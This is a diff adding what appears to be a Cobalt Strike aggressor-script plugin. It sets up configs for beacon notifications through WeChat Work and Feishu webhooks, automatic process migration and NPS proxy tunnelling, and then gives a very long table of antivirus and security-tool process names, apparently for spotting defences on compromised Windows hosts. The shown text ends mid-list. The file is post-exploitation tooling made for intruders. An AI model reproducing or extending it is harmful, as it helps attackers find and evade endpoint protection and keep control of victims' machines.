@@ -1,0 +1,1153 @@
+# 加载配置文件
+sub include_conf {
+	# 如果存在的话读取配置文件，不存在用默认配置
+	if (-exists script_resource("conf/".$1)){
+		# 加载配置文件
+		include(script_resource("conf/".$1));
+	}
+}
+
+# 创建配置文件目录
+sub mkdir_conf {
+	# 判断文件夹是否存在不存在创建
+	if (!-exists script_resource("conf"))
+	{
+		mkdir(script_resource("conf"));
+	}
+}
+
+# 配置文件名
+$qywx_conf = "qywx_conf.conf";
+$beacon_repeat_conf = "beacon_repeat.conf";
+$auto_qywx = "auto_qywx.conf";
+$auto_migration = "auto_migration.conf";
+$auto_nps = "auto_nps.conf";
+$fswebhook = "fswebhook.conf";
+
+# 先加载默认配置
+$onbre = true;
+$beacon_repeat = %(internal => "true", external => "true", computer => "true", listener => "false", user => "true");
+
+# 后加载配置文件
+include_conf($beacon_repeat_conf);
+include_conf($auto_qywx);
+include_conf($auto_migration);
+include_conf($qywx_conf);
+include_conf($auto_nps);
+include_conf($fswebhook);
+
+# av 列表
+$av = @( @("360tray.exe", "360安全卫士-实时保护"), @("360safe.exe", "360安全卫士-主程序"), @("ZhuDongFangYu.exe", "360安全卫士-主动防御"), @("360sd.exe", "360杀毒"), @("a2guard.exe", "a-squared杀毒"), @("ad-watch.exe", "Lavasoft杀毒"), @("cleaner8.exe", "The Cleaner杀毒"), @("vba32lder.exe", "vb32杀毒"), @("MongoosaGUI.exe", "Mongoosa杀毒"), @("CorantiControlCenter32.exe", "Coranti2012杀毒"), @("F-PROT.exe", "F-Prot AntiVirus"), @("CMCTrayIcon.exe", "CMC杀毒"), @("K7TSecurity.exe", "K7杀毒"), @("UnThreat.exe", "UnThreat杀毒"), @("CKSoftShiedAntivirus4.exe", "Shield Antivirus杀毒"), @("AVWatchService.exe", "VIRUSfighter杀毒"), @("ArcaTasksService.exe", "ArcaVir杀毒"), @("iptray.exe", "Immunet杀毒"), @("PSafeSysTray.exe", "PSafe杀毒"), @("nspupsvc.exe", "nProtect杀毒"), @("SpywareTerminatorShield.exe", "SpywareTerminator杀毒"), @("BKavService.exe", "Bkav杀毒"), @("MsMpEng.exe", "Microsoft Security Essentials"), @("SBAMSvc.exe", "VIPRE"), @("ccSvcHst.exe", "Norton杀毒"), @("f-secure.exe", "冰岛"), @("avp.exe", "Kaspersky"), @("KvMonXP.exe", "江民杀毒"), @("RavMonD.exe", "瑞星杀毒"), @("Mcshield.exe", "Mcafee"), @("Tbmon.exe", "Mcafee"), @("Frameworkservice.exe", "Mcafee"), @("egui.exe", "ESET NOD32"), @("ekrn.exe", "ESET NOD32"), @("eguiProxy.exe", "ESET NOD32"), @("kxetray.exe", "金山毒霸"), @("knsdtray.exe", "可牛杀毒"), @("TMBMSRV.exe", "趋势杀毒"), @("avcenter.exe", "Avira(小红伞)"), @("avguard.exe", "Avira(小红伞)"), @("avgnt.exe", "Avira(小红伞)"), @("sched.exe", "Avira(小红伞)"), @("ashDisp.exe", "Avast网络安全"), @("rtvscan.exe", "诺顿杀毒"), @("ccapp.exe", "Symantec Norton"), @("NPFMntor.exe", "Norton杀毒软件相关进程"), @("ccSetMgr.exe", "赛门铁克"), @("ccRegVfy.exe", "Norton杀毒软件自身完整性检查程序"), @("vptray.exe", "Norton病毒防火墙-盾牌图标程序"), @("ksafe.exe", "金山卫士"), @("QQPCRTP.exe", "QQ电脑管家"), @("Miner.exe", "流量矿石"), @("AYAgent.exe", "韩国胶囊"), @("patray.exe", "安博士"), @("V3Svc.exe", "安博士V3"), @("avgwdsvc.exe", "AVG杀毒"), @("QUHLPSVC.exe", "QUICK HEAL杀毒"), @("mssecess.exe", "微软杀毒"), @("SavProgress.exe", "Sophos杀毒"), @("SophosUI.exe", "Sophos杀毒"), @("SophosFS.exe", "Sophos杀毒"), @("SophosHealth.exe", "Sophos杀毒"), @("SophosSafestore64.exe", "Sophos杀毒"), @("SophosCleanM.exe", "Sophos杀毒"), @("fsavgui.exe", "F-Secure杀毒"), @("vsserv.exe", "比特梵德"), @("remupd.exe", "熊猫卫士"), @("FortiTray.exe", "飞塔"), @("safedog.exe", "安全狗"), @("parmor.exe", "木马克星"), @("Iparmor.exe.exe", "木马克星"), @("beikesan.exe", "贝壳云安全"), @("KSWebShield.exe", "金山网盾"), @("TrojanHunter.exe", "木马猎手"), @("GG.exe", "巨盾网游安全盾"), @("adam.exe", "绿鹰安全精灵"), @("AST.exe", "超级巡警"), @("ananwidget.exe", "墨者安全专家"), @("AVK.exe", "GData"), @("avg.exe", "AVG Anti-Virus"), @("spidernt.exe", "Dr.web"), @("avgaurd.exe", "Avira Antivir"), @("vsmon.exe", "ZoneAlarm"), @("cpf.exe", "Comodo"), @("outpost.exe", "Outpost Firewall"), @("rfwmain.exe", "瑞星防火墙"), @("kpfwtray.exe", "金山网镖"), @("FYFireWall.exe", "风云防火墙"), @("MPMon.exe", "微点主动防御"), @("pfw.exe", "天网防火墙"), @("S.exe", "在抓鸡"), @("1433.exe", "在扫1433"), @("DUB.exe", "在爆破"), @("ServUDaemon.exe", "发现S-U"), @("BaiduSdSvc.exe", "百度杀毒-服务进程"), @("BaiduSdTray.exe", "百度杀毒-托盘进程"), @("BaiduSd.exe", "百度杀毒-主程序"), @("SafeDogGuardCenter.exe", "安全狗"), @("safedogupdatecenter.exe", "安全狗"), @("safedogguardcenter.exe", "安全狗"), @("SafeDogSiteIIS.exe", "安全狗"), @("SafeDogTray.exe", "安全狗"), @("SafeDogServerUI.exe", "安全狗"), @("D_Safe_Manage.exe", "D盾"), @("d_manage.exe", "D盾"), @("yunsuo_agent_service.exe", "云锁"), @("yunsuo_agent_daemon.exe", "云锁"), @("HwsPanel.exe", "护卫神"), @("hws_ui.exe", "护卫神"), @("hws.exe", "护卫神"), @("hwsd.exe", "护卫神"), @("hipstray.exe", "火绒"), @("wsctrl.exe", "火绒"), @("usysdiag.exe", "火绒"), @("WEBSCANX.exe", "网络病毒克星"), @("SPHINX.exe", "SPHINX防火墙"), @("bddownloader.exe", "百度卫士"), @("baiduansvx.exe", "百度卫士-主进程"), @("AvastUI.exe", "Avast!5主程序"), @("emet_agent.exe", "已知杀软进程,名称暂未收录"), @("emet_service.exe", "已知杀软进程,名称暂未收录"), @("firesvc.exe", "已知杀软进程,名称暂未收录"), @("firetray.exe", "已知杀软进程,名称暂未收录"), @("hipsvc.exe", "已知杀软进程,名称暂未收录"), @("mfevtps.exe", "已知杀软进程,名称暂未收录"), @("mcafeefire.exe", "已知杀软进程,名称暂未收录"), @("scan32.exe", "已知杀软进程,名称暂未收录"), @("shstat.exe", "已知杀软进程,名称暂未收录"), @("vstskmgr.exe", "已知杀软进程,名称暂未收录"), @("engineserver.exe", "已知杀软进程,名称暂未收录"), @("mfeann.exe", "已知杀软进程,名称暂未收录"), @("mcscript.exe", "已知杀软进程,名称暂未收录"), @("updaterui.exe", "已知杀软进程,名称暂未收录"), @("udaterui.exe", "已知杀软进程,名称暂未收录"), @("naprdmgr.exe", "已知杀软进程,名称暂未收录"), @("cleanup.exe", "已知杀软进程,名称暂未收录"), @("cmdagent.exe", "已知杀软进程,名称暂未收录"), @("frminst.exe", "已知杀软进程,名称暂未收录"), @("mcscript_inuse.exe", "已知杀软进程,名称暂未收录"), @("mctray.exe", "已知杀软进程,名称暂未收录"), @("AAWTray.exe", "已知杀软进程,名称暂未收录"), @("Ad-Aware.exe", "已知杀软进程,名称暂未收录"), @("MSASCui.exe", "已知杀软进程,名称暂未收录"), @("_avp32.exe", "已知杀软进程,名称暂未收录"), @("_avpcc.exe", "已知杀软进程,名称暂未收录"), @("_avpm.exe", "已知杀软进程,名称暂未收录"), @("aAvgApi.exe", "已知杀软进程,名称暂未收录"), @("ackwin32.exe", "已知杀软进程,名称暂未收录"), @("adaware.exe", "已知杀软进程,名称暂未收录"), @("advxdwin.exe", "已知杀软进程,名称暂未收录"), @("agentsvr.exe", "已知杀软进程,名称暂未收录"), @("agentw.exe", "已知杀软进程,名称暂未收录"), @("alertsvc.exe", "已知杀软进程,名称暂未收录"), @("alevir.exe", "已知杀软进程,名称暂未收录"), @("alogserv.exe", "已知杀软进程,名称暂未收录"), @("amon9x.exe", "已知杀软进程,名称暂未收录"), @("anti-trojan.exe", "已知杀软进程,名称暂未收录"), @("antivirus.exe", "已知杀软进程,名称暂未收录"), @("ants.exe", "已知杀软进程,名称暂未收录"), @("apimonitor.exe", "已知杀软进程,名称暂未收录"), @("aplica32.exe", "已知杀软进程,名称暂未收录"), @("apvxdwin.exe", "已知杀软进程,名称暂未收录"), @("arr.exe", "已知杀软进程,名称暂未收录"), @("atcon.exe", "已知杀软进程,名称暂未收录"), @("atguard.exe", "已知杀软进程,名称暂未收录"), @("atro55en.exe", "已知杀软进程,名称暂未收录"), @("atupdater.exe", "已知杀软进程,名称暂未收录"), @("atwatch.exe", "已知杀软进程,名称暂未收录"), @("au.exe", "已知杀软进程,名称暂未收录"), @("aupdate.exe", "已知杀软进程,名称暂未收录"), @("auto-protect.nav80try.exe", "已知杀软进程,名称暂未收录"), @("autodown.exe", "已知杀软进程,名称暂未收录"), @("autotrace.exe", "已知杀软进程,名称暂未收录"), @("autoupdate.exe", "已知杀软进程,名称暂未收录"), @("avconsol.exe", "已知杀软进程,名称暂未收录"), @("ave32.exe", "已知杀软进程,名称暂未收录"), @("avgcc32.exe", "已知杀软进程,名称暂未收录"), @("avgctrl.exe", "已知杀软进程,名称暂未收录"), @("avgemc.exe", "已知杀软进程,名称暂未收录"), @("avgrsx.exe", "已知杀软进程,名称暂未收录"), @("avgserv.exe", "已知杀软进程,名称暂未收录"), @("avgserv9.exe", "已知杀软进程,名称暂未收录"), @("avgw.exe", "已知杀软进程,名称暂未收录"), @("avkpop.exe", "已知杀软进程,名称暂未收录"), @("avkserv.exe", "已知杀软进程,名称暂未收录"), @("avkservice.exe", "已知杀软进程,名称暂未收录"), @("avkwctl9.exe", "已知杀软进程,名称暂未收录"), @("avltmain.exe", "已知杀软进程,名称暂未收录"), @("avnt.exe", "已知杀软进程,名称暂未收录"), @("avp32.exe", "已知杀软进程,名称暂未收录"), @("avpcc.exe", "已知杀软进程,名称暂未收录"), @("avpdos32.exe", "已知杀软进程,名称暂未收录"), @("avpm.exe", "已知杀软进程,名称暂未收录"), @("avptc32.exe", "已知杀软进程,名称暂未收录"), @("avpupd.exe", "已知杀软进程,名称暂未收录"), @("avsched32.exe", "已知杀软进程,名称暂未收录"), @("avsynmgr.exe", "已知杀软进程,名称暂未收录"), @("avwin.exe", "已知杀软进程,名称暂未收录"), @("avwin95.exe", "已知杀软进程,名称暂未收录"), @("avwinnt.exe", "已知杀软进程,名称暂未收录"), @("avwupd.exe", "已知杀软进程,名称暂未收录"), @("avwupd32.exe", "已知杀软进程,名称暂未收录"), @("avwupsrv.exe", "已知杀软进程,名称暂未收录"), @("avxmonitor9x.exe", "已知杀软进程,名称暂未收录"), @("avxmonitornt.exe", "已知杀软进程,名称暂未收录"), @("avxquar.exe", "已知杀软进程,名称暂未收录"), @("backweb.exe", "已知杀软进程,名称暂未收录"), @("bargains.exe", "已知杀软进程,名称暂未收录"), @("bd_professional.exe", "已知杀软进程,名称暂未收录"), @("beagle.exe", "已知杀软进程,名称暂未收录"), @("belt.exe", "已知杀软进程,名称暂未收录"), @("bidef.exe", "已知杀软进程,名称暂未收录"), @("bidserver.exe", "已知杀软进程,名称暂未收录"), @("bipcp.exe", "已知杀软进程,名称暂未收录"), @("bipcpevalsetup.exe", "已知杀软进程,名称暂未收录"), @("bisp.exe", "已知杀软进程,名称暂未收录"), @("blackd.exe", "已知杀软进程,名称暂未收录"), @("blackice.exe", "已知杀软进程,名称暂未收录"), @("blink.exe", "已知杀软进程,名称暂未收录"), @("blss.exe", "已知杀软进程,名称暂未收录"), @("bootconf.exe", "已知杀软进程,名称暂未收录"), @("bootwarn.exe", "已知杀软进程,名称暂未收录"), @("borg2.exe", "已知杀软进程,名称暂未收录"), @("bpc.exe", "已知杀软进程,名称暂未收录"), @("brasil.exe", "已知杀软进程,名称暂未收录"), @("bs120.exe", "已知杀软进程,名称暂未收录"), @("bundle.exe", "已知杀软进程,名称暂未收录"), @("bvt.exe", "已知杀软进程,名称暂未收录"), @("ccevtmgr.exe", "已知杀软进程,名称暂未收录"), @("ccpxysvc.exe", "已知杀软进程,名称暂未收录"), @("cdp.exe", "已知杀软进程,名称暂未收录"), @("cfd.exe", "已知杀软进程,名称暂未收录"), @("cfgwiz.exe", "已知杀软进程,名称暂未收录"), @("cfiadmin.exe", "已知杀软进程,名称暂未收录"), @("cfiaudit.exe", "已知杀软进程,名称暂未收录"), @("cfinet.exe", "已知杀软进程,名称暂未收录"), @("cfinet32.exe", "已知杀软进程,名称暂未收录"), @("claw95.exe", "已知杀软进程,名称暂未收录"), @("claw95cf.exe", "已知杀软进程,名称暂未收录"), @("clean.exe", "已知杀软进程,名称暂未收录"), @("cleaner.exe", "已知杀软进程,名称暂未收录"), @("cleaner3.exe", "已知杀软进程,名称暂未收录"), @("cleanpc.exe", "已知杀软进程,名称暂未收录"), @("click.exe", "已知杀软进程,名称暂未收录"), @("cmesys.exe", "已知杀软进程,名称暂未收录"), @("cmgrdian.exe", "已知杀软进程,名称暂未收录"), @("cmon016.exe", "已知杀软进程,名称暂未收录"), @("connectionmonitor.exe", "已知杀软进程,名称暂未收录"), @("cpd.exe", "已知杀软进程,名称暂未收录"), @("cpf9x206.exe", "已知杀软进程,名称暂未收录"), @("cpfnt206.exe", "已知杀软进程,名称暂未收录"), @("ctrl.exe", "已知杀软进程,名称暂未收录"), @("cv.exe", "已知杀软进程,名称暂未收录"), @("cwnb181.exe", "已知杀软进程,名称暂未收录"), @("cwntdwmo.exe", "已知杀软进程,名称暂未收录"), @("datemanager.exe", "已知杀软进程,名称暂未收录"), @("dcomx.exe", "已知杀软进程,名称暂未收录"), @("defalert.exe", "已知杀软进程,名称暂未收录"), @("defscangui.exe", "已知杀软进程,名称暂未收录"), @("defwatch.exe", "已知杀软进程,名称暂未收录"), @("deputy.exe", "已知杀软进程,名称暂未收录"), @("divx.exe", "已知杀软进程,名称暂未收录"), @("dllcache.exe", "已知杀软进程,名称暂未收录"), @("dllreg.exe", "已知杀软进程,名称暂未收录"), @("doors.exe", "已知杀软进程,名称暂未收录"), @("dpf.exe", "已知杀软进程,名称暂未收录"), @("dpfsetup.exe", "已知杀软进程,名称暂未收录"), @("dpps2.exe", "已知杀软进程,名称暂未收录"), @("drwatson.exe", "已知杀软进程,名称暂未收录"), @("drweb32.exe", "已知杀软进程,名称暂未收录"), @("drwebupw.exe", "已知杀软进程,名称暂未收录"), @("dssagent.exe", "已知杀软进程,名称暂未收录"), @("dvp95.exe", "已知杀软进程,名称暂未收录"), @("dvp95_0.exe", "已知杀软进程,名称暂未收录"), @("ecengine.exe", "已知杀软进程,名称暂未收录"), @("efpeadm.exe", "已知杀软进程,名称暂未收录"), @("emsw.exe", "已知杀软进程,名称暂未收录"), @("ent.exe", "已知杀软进程,名称暂未收录"), @("esafe.exe", "已知杀软进程,名称暂未收录"), @("escanhnt.exe", "已知杀软进程,名称暂未收录"), @("escanv95.exe", "已知杀软进程,名称暂未收录"), @("espwatch.exe", "已知杀软进程,名称暂未收录"), @("ethereal.exe", "已知杀软进程,名称暂未收录"), @("etrustcipe.exe", "已知杀软进程,名称暂未收录"), @("evpn.exe", "已知杀软进程,名称暂未收录"), @("exantivirus-cnet.exe", "已知杀软进程,名称暂未收录"), @("exe.avxw.exe", "已知杀软进程,名称暂未收录"), @("expert.exe", "已知杀软进程,名称暂未收录"), @("explore.exe", "已知杀软进程,名称暂未收录"), @("f-agnt95.exe", "已知杀软进程,名称暂未收录"), @("f-prot95.exe", "已知杀软进程,名称暂未收录"), @("f-stopw.exe", "已知杀软进程,名称暂未收录"), @("fameh32.exe", "已知杀软进程,名称暂未收录"), @("fast.exe", "已知杀软进程,名称暂未收录"), @("fch32.exe", "已知杀软进程,名称暂未收录"), @("fih32.exe", "已知杀软进程,名称暂未收录"), @("findviru.exe", "已知杀软进程,名称暂未收录"), @("firewall.exe", "已知杀软进程,名称暂未收录"), @("fnrb32.exe", "已知杀软进程,名称暂未收录"), @("fp-win.exe", "已知杀软进程,名称暂未收录"), @("fp-win_trial.exe", "已知杀软进程,名称暂未收录"), @("fprot.exe", "已知杀软进程,名称暂未收录"), @("frw.exe", "已知杀软进程,名称暂未收录"), @("fsaa.exe", "已知杀软进程,名称暂未收录"), @("fsav.exe", "已知杀软进程,名称暂未收录"), @("fsav32.exe", "已知杀软进程,名称暂未收录"), @("fsav530stbyb.exe", "已知杀软进程,名称暂未收录"), @("fsav530wtbyb.exe", "已知杀软进程,名称暂未收录"), @("fsav95.exe", "已知杀软进程,名称暂未收录"), @("fsgk32.exe", "已知杀软进程,名称暂未收录"), @("fsm32.exe", "已知杀软进程,名称暂未收录"), @("fsma32.exe", "已知杀软进程,名称暂未收录"), @("fsmb32.exe", "已知杀软进程,名称暂未收录"), @("gator.exe", "已知杀软进程,名称暂未收录"), @("gbmenu.exe", "已知杀软进程,名称暂未收录"), @("gbpoll.exe", "已知杀软进程,名称暂未收录"), @("generics.exe", "已知杀软进程,名称暂未收录"), @("gmt.exe", "已知杀软进程,名称暂未收录"), @("guard.exe", "已知杀软进程,名称暂未收录"), @("guarddog.exe", "已知杀软进程,名称暂未收录"), @("hacktracersetup.exe", "已知杀软进程,名称暂未收录"), @("hbinst.exe", "已知杀软进程,名称暂未收录"), @("hbsrv.exe", "已知杀软进程,名称暂未收录"), @("hotactio.exe", "已知杀软进程,名称暂未收录"), @("hotpatch.exe", "已知杀软进程,名称暂未收录"), @("htlog.exe", "已知杀软进程,名称暂未收录"), @("htpatch.exe", "已知杀软进程,名称暂未收录"), @("hwpe.exe", "已知杀软进程,名称暂未收录"), @("hxdl.exe", "已知杀软进程,名称暂未收录"), @("hxiul.exe", "已知杀软进程,名称暂未收录"), @("iamapp.exe", "已知杀软进程,名称暂未收录"), @("iamserv.exe", "已知杀软进程,名称暂未收录"), @("iamstats.exe", "已知杀软进程,名称暂未收录"), @("ibmasn.exe", "已知杀软进程,名称暂未收录"), @("ibmavsp.exe", "已知杀软进程,名称暂未收录"), @("icload95.exe", "已知杀软进程,名称暂未收录"), @("icloadnt.exe", "已知杀软进程,名称暂未收录"), @("icmon.exe", "已知杀软进程,名称暂未收录"), @("icsupp95.exe", "已知杀软进程,名称暂未收录"), @("icsuppnt.exe", "已知杀软进程,名称暂未收录"), @("idle.exe", "已知杀软进程,名称暂未收录"), @("iedll.exe", "已知杀软进程,名称暂未收录"), @("iedriver.exe", "已知杀软进程,名称暂未收录"), @("iface.exe", "已知杀软进程,名称暂未收录"), @("ifw2000.exe", "已知杀软进程,名称暂未收录"), @("inetlnfo.exe", "已知杀软进程,名称暂未收录"), @("infus.exe", "已知杀软进程,名称暂未收录"), @("infwin.exe", "已知杀软进程,名称暂未收录"), @("init.exe", "已知杀软进程,名称暂未收录"), @("intdel.exe", "已知杀软进程,名称暂未收录"), @("intren.exe", "已知杀软进程,名称暂未收录"), @("iomon98.exe", "已知杀软进程,名称暂未收录"), @("istsvc.exe", "已知杀软进程,名称暂未收录"), @("jammer.exe", "已知杀软进程,名称暂未收录"), @("jdbgmrg.exe", "已知杀软进程,名称暂未收录"), @("jedi.exe", "已知杀软进程,名称暂未收录"), @("kavlite40eng.exe", "已知杀软进程,名称暂未收录"), @("kavpers40eng.exe", "已知杀软进程,名称暂未收录"), @("kavpf.exe", "已知杀软进程,名称暂未收录"), @("kazza.exe", "已知杀软进程,名称暂未收录"), @("keenvalue.exe", "已知杀软进程,名称暂未收录"), @("kerio-pf-213-en-win.exe", "已知杀软进程,名称暂未收录"), @("kerio-wrl-421-en-win.exe", "已知杀软进程,名称暂未收录"), @("kerio-wrp-421-en-win.exe", "已知杀软进程,名称暂未收录"), @("kernel32.exe", "已知杀软进程,名称暂未收录"), @("killprocesssetup161.exe", "已知杀软进程,名称暂未收录"), @("launcher.exe", "已知杀软进程,名称暂未收录"), @("ldnetmon.exe", "已知杀软进程,名称暂未收录"), @("ldpro.exe", "已知杀软进程,名称暂未收录"), @("ldpromenu.exe", "已知杀软进程,名称暂未收录"), @("ldscan.exe", "已知杀软进程,名称暂未收录"), @("lnetinfo.exe", "已知杀软进程,名称暂未收录"), @("loader.exe", "已知杀软进程,名称暂未收录"), @("localnet.exe", "已知杀软进程,名称暂未收录"), @("lockdown.exe", "已知杀软进程,名称暂未收录"), @("lockdown2000.exe", "已知杀软进程,名称暂未收录"), @("lookout.exe", "已知杀软进程,名称暂未收录"), @("lordpe.exe", "已知杀软进程,名称暂未收录"), @("lsetup.exe", "已知杀软进程,名称暂未收录"), @("luall.exe", "已知杀软进程,名称暂未收录"), @("luau.exe", "已知杀软进程,名称暂未收录"), @("lucomserver.exe", "已知杀软进程,名称暂未收录"), @("luinit.exe", "已知杀软进程,名称暂未收录"), @("luspt.exe", "已知杀软进程,名称暂未收录"), @("mapisvc32.exe", "已知杀软进程,名称暂未收录"), @("mcagent.exe", "已知杀软进程,名称暂未收录"), @("mcmnhdlr.exe", "已知杀软进程,名称暂未收录"), @("mctool.exe", "已知杀软进程,名称暂未收录"), @("mcupdate.exe", "已知杀软进程,名称暂未收录"), @("mcvsrte.exe", "已知杀软进程,名称暂未收录"), @("mcvsshld.exe", "已知杀软进程,名称暂未收录"), @("md.exe", "已知杀软进程,名称暂未收录"), @("mfin32.exe", "已知杀软进程,名称暂未收录"), @("mfw2en.exe", "已知杀软进程,名称暂未收录"), @("mfweng3.02d30.exe", "已知杀软进程,名称暂未收录"), @("mgavrtcl.exe", "已知杀软进程,名称暂未收录"), @("mgavrte.exe", "已知杀软进程,名称暂未收录"), @("mghtml.exe", "已知杀软进程,名称暂未收录"), @("mgui.exe", "已知杀软进程,名称暂未收录"), @("minilog.exe", "已知杀软进程,名称暂未收录"), @("mmod.exe", "已知杀软进程,名称暂未收录"), @("monitor.exe", "已知杀软进程,名称暂未收录"), @("moolive.exe", "已知杀软进程,名称暂未收录"), @("mostat.exe", "已知杀软进程,名称暂未收录"), @("mpfagent.exe", "已知杀软进程,名称暂未收录"), @("mpfservice.exe", "已知杀软进程,名称暂未收录"), @("mpftray.exe", "已知杀软进程,名称暂未收录"), @("mrflux.exe", "已知杀软进程,名称暂未收录"), @("msapp.exe", "已知杀软进程,名称暂未收录"), @("msbb.exe", "已知杀软进程,名称暂未收录"), @("msblast.exe", "已知杀软进程,名称暂未收录"), @("mscache.exe", "已知杀软进程,名称暂未收录"), @("msccn32.exe", "已知杀软进程,名称暂未收录"), @("mscman.exe", "已知杀软进程,名称暂未收录"), @("msconfig.exe", "已知杀软进程,名称暂未收录"), @("msdm.exe", "已知杀软进程,名称暂未收录"), @("msdos.exe", "已知杀软进程,名称暂未收录"), @("msiexec16.exe", "已知杀软进程,名称暂未收录"), @("msinfo32.exe", "已知杀软进程,名称暂未收录"), @("mslaugh.exe", "已知杀软进程,名称暂未收录"), @("msmgt.exe", "已知杀软进程,名称暂未收录"), @("msmsgri32.exe", "已知杀软进程,名称暂未收录"), @("mssmmc32.exe", "已知杀软进程,名称暂未收录"), @("mssys.exe", "已知杀软进程,名称暂未收录"), @("msvxd.exe", "已知杀软进程,名称暂未收录"), @("mu0311ad.exe", "已知杀软进程,名称暂未收录"), @("mwatch.exe", "已知杀软进程,名称暂未收录"), @("n32scanw.exe", "已知杀软进程,名称暂未收录"), @("nav.exe", "已知杀软进程,名称暂未收录"), @("navap.navapsvc.exe", "已知杀软进程,名称暂未收录"), @("navapsvc.exe", "已知杀软进程,名称暂未收录"), @("navapw32.exe", "已知杀软进程,名称暂未收录"), @("navdx.exe", "已知杀软进程,名称暂未收录"), @("navlu32.exe", "已知杀软进程,名称暂未收录"), @("navnt.exe", "已知杀软进程,名称暂未收录"), @("navstub.exe", "已知杀软进程,名称暂未收录"), @("navw32.exe", "已知杀软进程,名称暂未收录"), @("navwnt.exe", "已知杀软进程,名称暂未收录"), @("nc2000.exe", "已知杀软进程,名称暂未收录"), @("ncinst4.exe", "已知杀软进程,名称暂未收录"), @("ndd32.exe", "已知杀软进程,名称暂未收录"), @("neomonitor.exe", "已知杀软进程,名称暂未收录"), @("neowatchlog.exe", "已知杀软进程,名称暂未收录"), @("netarmor.exe", "已知杀软进程,名称暂未收录"), @("netd32.exe", "已知杀软进程,名称暂未收录"), @("netinfo.exe", "已知杀软进程,名称暂未收录"), @("netmon.exe", "已知杀软进程,名称暂未收录"), @("netscanpro.exe", "已知杀软进程,名称暂未收录"), @("netspyhunter-1.2.exe", "已知杀软进程,名称暂未收录"), @("netstat.exe", "已知杀软进程,名称暂未收录"), @("netutils.exe", "已知杀软进程,名称暂未收录"), @("nisserv.exe", "已知杀软进程,名称暂未收录"), @("nisum.exe", "已知杀软进程,名称暂未收录"), @("nmain.exe", "已知杀软进程,名称暂未收录"), @("nod32.exe", "已知杀软进程,名称暂未收录"), @("normist.exe", "已知杀软进程,名称暂未收录"), @("norton_internet_secu_3.0_407.exe", "已知杀软进程,名称暂未收录"), @("notstart.exe", "已知杀软进程,名称暂未收录"), @("npf40_tw_98_nt_me_2k.exe", "已知杀软进程,名称暂未收录"), @("npfmessenger.exe", "已知杀软进程,名称暂未收录"), @("nprotect.exe", "已知杀软进程,名称暂未收录"), @("npscheck.exe", "已知杀软进程,名称暂未收录"), @("npssvc.exe", "已知杀软进程,名称暂未收录"), @("nsched32.exe", "已知杀软进程,名称暂未收录"), @("nssys32.exe", "已知杀软进程,名称暂未收录"), @("nstask32.exe", "已知杀软进程,名称暂未收录"), @("nsupdate.exe", "已知杀软进程,名称暂未收录"), @("nt.exe", "已知杀软进程,名称暂未收录"), @("ntrtscan.exe", "已知杀软进程,名称暂未收录"), @("ntvdm.exe", "已知杀软进程,名称暂未收录"), @("ntxconfig.exe", "已知杀软进程,名称暂未收录"), @("nui.exe", "已知杀软进程,名称暂未收录"), @("nupgrade.exe", "已知杀软进程,名称暂未收录"), @("nvarch16.exe", "已知杀软进程,名称暂未收录"), @("nvc95.exe", "已知杀软进程,名称暂未收录"), @("nvsvc32.exe", "已知杀软进程,名称暂未收录"), @("nwinst4.exe", "已知杀软进程,名称暂未收录"), @("nwservice.exe", "已知杀软进程,名称暂未收录"), @("nwtool16.exe", "已知杀软进程,名称暂未收录"), @("ollydbg.exe", "已知杀软进程,名称暂未收录"), @("onsrvr.exe", "已知杀软进程,名称暂未收录"), @("optimize.exe", "已知杀软进程,名称暂未收录"), @("ostronet.exe", "已知杀软进程,名称暂未收录"), @("otfix.exe", "已知杀软进程,名称暂未收录"), @("outpostinstall.exe", "已知杀软进程,名称暂未收录"), @("outpostproinstall.exe", "已知杀软进程,名称暂未收录"), @("padmin.exe", "已知杀软进程,名称暂未收录"), @("panixk.exe", "已知杀软进程,名称暂未收录"), @("patch.exe", "已知杀软进程,名称暂未收录"), @("pavcl.exe", "已知杀软进程,名称暂未收录"), @("pavproxy.exe", "已知杀软进程,名称暂未收录"), @("pavsched.exe", "已知杀软进程,名称暂未收录"), @("pavw.exe", "已知杀软进程,名称暂未收录"), @("pccwin98.exe", "已知杀软进程,名称暂未收录"), @("pcfwallicon.exe", "已知杀软进程,名称暂未收录"), @("pcip10117_0.exe", "已知杀软进程,名称暂未收录"), @("pcscan.exe", "已知杀软进程,名称暂未收录"), @("pdsetup.exe", "已知杀软进程,名称暂未收录"), @("periscope.exe", "已知杀软进程,名称暂未收录"), @("persfw.exe", "已知杀软进程,名称暂未收录"), @("perswf.exe", "已知杀软进程,名称暂未收录"), @("pf2.exe", "已知杀软进程,名称暂未收录"), @("pfwadmin.exe", "已知杀软进程,名称暂未收录"), @("pgmonitr.exe", "已知杀软进程,名称暂未收录"), @("pingscan.exe", "已知杀软进程,名称暂未收录"), @("platin.exe", "已知杀软进程,名称暂未收录"), @("pop3trap.exe", "已知杀软进程,名称暂未收录"), @("poproxy.exe", "已知杀软进程,名称暂未收录"), @("popscan.exe", "已知杀软进程,名称暂未收录"), @("portdetective.exe", "已知杀软进程,名称暂未收录"), @("portmonitor.exe", "已知杀软进程,名称暂未收录"), @("powerscan.exe", "已知杀软进程,名称暂未收录"), @("ppinupdt.exe", "已知杀软进程,名称暂未收录"), @("pptbc.exe", "已知杀软进程,名称暂未收录"), @("ppvstop.exe", "已知杀软进程,名称暂未收录"), @("prizesurfer.exe", "已知杀软进程,名称暂未收录"), @("prmt.exe", "已知杀软进程,名称暂未收录"), @("prmvr.exe", "已知杀软进程,名称暂未收录"), @("procdump.exe", "已知杀软进程,名称暂未收录"), @("processmonitor.exe", "已知杀软进程,名称暂未收录"), @("procexplorerv1.0.exe", "已知杀软进程,名称暂未收录"), @("programauditor.exe", "已知杀软进程,名称暂未收录"), @("proport.exe", "已知杀软进程,名称暂未收录"), @("protectx.exe", "已知杀软进程,名称暂未收录"), @("pspf.exe", "已知杀软进程,名称暂未收录"), @("purge.exe", "已知杀软进程,名称暂未收录"), @("qconsole.exe", "已知杀软进程,名称暂未收录"), @("qserver.exe", "已知杀软进程,名称暂未收录"), @("rapapp.exe", "已知杀软进程,名称暂未收录"), @("rav7.exe", "已知杀软进程,名称暂未收录"), @("rav7win.exe", "已知杀软进程,名称暂未收录"), @("rav8win32eng.exe", "已知杀软进程,名称暂未收录"), @("ray.exe", "已知杀软进程,名称暂未收录"), @("rb32.exe", "已知杀软进程,名称暂未收录"), @("rcsync.exe", "已知杀软进程,名称暂未收录"), @("realmon.exe", "已知杀软进程,名称暂未收录"), @("reged.exe", "已知杀软进程,名称暂未收录"), @("regedit.exe", "已知杀软进程,名称暂未收录"), @("regedt32.exe", "已知杀软进程,名称暂未收录"), @("rescue.exe", "已知杀软进程,名称暂未收录"), 